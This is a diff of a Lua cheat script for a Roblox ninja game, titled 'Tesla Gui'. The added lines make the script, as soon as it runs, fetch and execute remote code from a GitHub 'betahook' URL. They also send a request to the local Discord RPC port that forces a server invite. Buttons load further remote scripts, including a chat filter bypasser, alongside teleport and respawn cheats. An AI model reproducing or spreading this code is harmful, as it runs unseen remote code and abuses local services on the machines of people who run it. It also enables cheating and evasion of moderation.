@@ -1,8 +1,24 @@
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Tesla Gui";
-    Text = "Welcome Developer";
-    Duration = 7;
-    })
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/betahook",true))()
+
+local request = (syn and syn.request) or (http and http.request) or http_request
+
+if request then 
+	request({
+		Url = "http://127.0.0.1:6463/rpc?v=1",
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json",
+			["Origin"] = "https://discord.com"
+		},
+		Body = game:GetService("HttpService"):JSONEncode({
+			cmd = "INVITE_BROWSER",
+			args = {code = "9ewWru4H5M"},
+			nonce = game:GetService("HttpService"):GenerateGUID(false)
+		}),
+	})
+
+end
+
 local NinjaGui = Instance.new("ScreenGui")
 local about = Instance.new("Frame")
 local ImageLabel = Instance.new("ImageLabel")
@@ -291,7 +307,7 @@ alphatest.BorderSizePixel = 0
 alphatest.Position = UDim2.new(0.0145719489, 0, 1.99454224, 0)
 alphatest.Size = UDim2.new(0, 540, 0, 50)
 alphatest.Font = Enum.Font.SourceSans
-alphatest.Text = "alpha tester:"
+alphatest.Text = "alpha tester: darko,Myx and Lightning"
 alphatest.TextColor3 = Color3.fromRGB(231, 231, 231)
 alphatest.TextSize = 14.000
 
@@ -338,7 +354,7 @@ watermark.BorderSizePixel = 0
 watermark.Position = UDim2.new(0.774634182, 0, -0.0417171121, 0)
 watermark.Size = UDim2.new(0, 327, 0, 33)
 watermark.Font = Enum.Font.SourceSans
-watermark.Text = "Tesla Gui  v2 private alpha: Dev build"
+watermark.Text = "Tesla Gui  v2: Dev build."
 watermark.TextColor3 = Color3.fromRGB(222, 92, 254)
 watermark.TextSize = 14.000
 
@@ -1647,7 +1663,7 @@ AutoFarmMode.MouseButton1Down:connect(function()
 		game.StarterGui:SetCore("SendNotification", {
 		Title = "Tesla Gui";
 			Text = "Now Just Press AutoFarm";
-			Duration = 7;
+			Duration = 15;
 		})
 	
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/AdamantiunGG/NinjaAssasinMainScript/main/anti%20afk", true))()
@@ -1694,7 +1710,9 @@ ChatBypasser.Text = "Chat Bypasser"
 ChatBypasser.TextColor3 = Color3.fromRGB(241, 241, 241)
 ChatBypasser.TextSize = 14.000
 ChatBypasser.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
-
+ChatBypasser.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
+end)
 FastSword.Name = "FastSword"
 FastSword.Parent = MiscLabel
 FastSword.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
@@ -1825,6 +1843,9 @@ Respawn.Text = "Respawn"
 Respawn.TextColor3 = Color3.fromRGB(241, 241, 241)
 Respawn.TextSize = 14.000
 Respawn.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
+Respawn.MouseButton1Down:connect(function()
+	game:GetService("ReplicatedStorage").RemoteEvent.SpawnCharacterEvent:FireServer("MainSpawn")
+end)
 
 local Pos = {}
 
@@ -1841,29 +1862,7 @@ SafeSpot.TextColor3 = Color3.fromRGB(241, 241, 241)
 SafeSpot.TextSize = 14.000
 SafeSpot.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
 SafeSpot.MouseButton1Down:connect(function()
-	local Char = game.Players.LocalPlayer.Character 
-	_G.SafeSpot = not _G.SafeSpot
-	if _G.SafeSpot then
-		SafeSpot.Text = 'UnSafeSpot'
-		table.insert(Pos, Char.Head.Position)
-	else
-		SafeSpot.Text = 'SafeSpot'
-		wait(0.5)
-		Char.HumanoidRootPart.CFrame = CFrame.new(Pos[1])
-		table.clear(Pos)
-	end
-	while game.RunService.RenderStepped:wait() do
-		if _G.SafeSpot then
-			pcall(function()
-				Char.HumanoidRootPart.CFrame = CFrame.new(-9e6,9e6,-9e6)
-				for i,v in pairs(Char:GetChildren()) do
-					v.Velocity = Vector3.new(0,0,0)
-				end
-			end)
-		else
-			break
-		end
-	end
+	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(600000, 600001, 600000)
 end)
 
 local function LFKJCS_fake_script() -- NinjaGui.Script 
@@ -2058,3 +2057,14 @@ end
 
 
 coroutine.wrap(LFKJCS_fake_script)()
+
+
+--coisas
+
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "Script Cloud status(online)\nBetaVersion:\nAE%5BV2EB\n Cloud sycn: Not Working\n script build: v2.0";
+    Color = Color3.fromRGB(138,43,226);
+    Font = Enum.Font.SourceSansBold;
+    FontSize = Enum.FontSize.Size96;
+})
+wait()
